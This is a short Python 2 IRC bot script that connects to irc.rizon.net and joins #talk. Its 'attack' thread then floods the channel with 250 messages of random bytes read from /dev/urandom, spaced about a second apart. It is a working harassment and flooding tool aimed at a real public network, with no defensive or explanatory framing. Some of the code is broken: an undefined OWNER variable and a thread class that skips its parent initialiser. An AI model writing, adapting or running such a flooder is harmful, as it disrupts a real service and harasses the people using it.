import socket
import time
import random
from threading import Thread

HOST = 'irc.rizon.net'
PORT = 6667
NICK = 'YUTFUK'
USER = 'lkashdf'
REALNAME = 'lel'
PASS = ''
CHANNEL = "#talk"
NUM = 250
NICKPASS = ''
readbuffer = ""
regged = 0
thread_running = 0
testthread = False

devrand = open('/dev/urandom','r')

def handle_priv(sender, target, command, text):
	global OWNER
	print target + ": <" + sender + "> " + text
	if (OWNER in sender and text == '^run'):
		global testthread
		testthread.run()

class lolthread(Thread):
	def __init__(self, whattodo):
		self.whattodo = whattodo
	def run(self):
		if (self.whattodo == 'attack'):
			global devrand, CHANNEL, NUM
			for i in xrange(1, NUM):
				templine = devrand.read(random.randint(256,512))
				s.send("PRIVMSG " + CHANNEL + " " + templine + "\r\n")
				time.sleep(1.2)
		else:
			print "Yup, I'm doing stuff (and by that, I mean nothing)"
			return


def run_thread():
	global thread_running, testthread
	if (thread_running != 1):
		testthread = lolthread('attack')
		testthread.start()
		thread_running = 1
	else:
		return


def dostuff(data):
	target = data[2]
	sender = data[0]
	sender = sender[1:]
	command = data[1]
	text = (' '.join(data[3:]))
	text = text[1:]
	if (command.upper() == "PRIVMSG"):
		handle_priv(sender, target, command, text)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
time.sleep(1)

s.send("PASS :" + PASS + '\r\n')
s.send("NICK " + NICK + '\r\n')
s.send("USER " + USER + " +iwx 0 " + ":" + REALNAME + '\r\n')

while 1:
	readbuffer = readbuffer + s.recv(512)
	temp = readbuffer.split("\r\n")
	readbuffer = temp.pop( )
	for line in temp:
		print line
		line = line.rstrip()
		line = line.split()
		if (line[0] == 'PING'):
			s.send("PONG " + line[1] + "\r\n")
			print "PING? PONG!"
			continue
		if (regged != 1):
			if (line[1] == "005"):
				regged = 1
				if NICKPASS:
					s.send("MSG NickServ IDENTIFY " + NICKPASS + "\r\n")
					time.sleep(4)
				s.send("JOIN " + CHANNEL + "\r\n")
				continue
			else:
				continue
		else:
			run_thread()
			dostuff(line)
